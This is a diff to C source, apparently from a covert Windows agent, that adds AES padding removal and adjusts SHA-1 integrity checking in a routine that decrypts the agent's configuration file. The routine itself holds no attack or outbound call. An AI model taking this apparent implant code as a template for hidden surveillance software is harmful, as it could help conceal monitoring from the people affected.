@@ -1952,7 +1952,8 @@ BOOL HM_CheckNewConf()
 
 // Ritorna una zona di memoria con il file di configurazione
 // in chiaro. Va liberata!!!. Torna NULL se fallisce.
-#define MINIMUM_CONF_LEN (SHA_DIGEST_LENGTH+1)
+#define AES_BLOCK_LEN 16
+#define MINIMUM_CONF_LEN (SHA_DIGEST_LENGTH+AES_BLOCK_LEN)
 char *HM_ReadClearConf(char *conf_name)
 {
 	BYTE iv[BLOCK_LEN];
@@ -1963,6 +1964,7 @@ char *HM_ReadClearConf(char *conf_name)
 	char conf_path[DLLNAMELEN];
 	BYTE crc[SHA_DIGEST_LENGTH];
 	BOOL crc_ok = FALSE;
+	DWORD pad_len;
 
 	// Mappa per comodita' il file di configurazione nella memoria
 	h_conf_file = FNC(CreateFileA)(HM_CompletePath(conf_name, conf_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
@@ -1994,6 +1996,13 @@ char *HM_ReadClearConf(char *conf_name)
 	if (!conf_memory_clear)
 		return NULL;
 
+	// Elimina il padding
+	pad_len = conf_memory_clear[conf_len-1];
+	if (pad_len>AES_BLOCK_LEN) {
+		SAFE_FREE(conf_memory_clear);
+		return NULL;
+	}
+
 	// Check del CRC
 	SHA1Context sha;
 	SHA1Reset(&sha);
@@ -2002,7 +2011,7 @@ char *HM_ReadClearConf(char *conf_name)
 		for (int i=0; i<5; i++)
 			sha.Message_Digest[i] = ntohl(sha.Message_Digest[i]);
 		memcpy(crc, sha.Message_Digest, SHA_DIGEST_LENGTH);
-		if (!memcmp(crc, conf_memory_clear + conf_len - SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH))
+		if (!memcmp(crc, conf_memory_clear + conf_len - SHA_DIGEST_LENGTH - pad_len, SHA_DIGEST_LENGTH))
 			crc_ok = TRUE;
 	}
 
@@ -2010,6 +2019,9 @@ char *HM_ReadClearConf(char *conf_name)
 		SAFE_FREE(conf_memory_clear);
 		return NULL;
 	}
+
+	// NULL termina la stringa azzerando il CRC
+	memset(conf_memory_clear + conf_len - SHA_DIGEST_LENGTH - pad_len, 0, SHA_DIGEST_LENGTH);
 
 	return conf_memory_clear;
 }
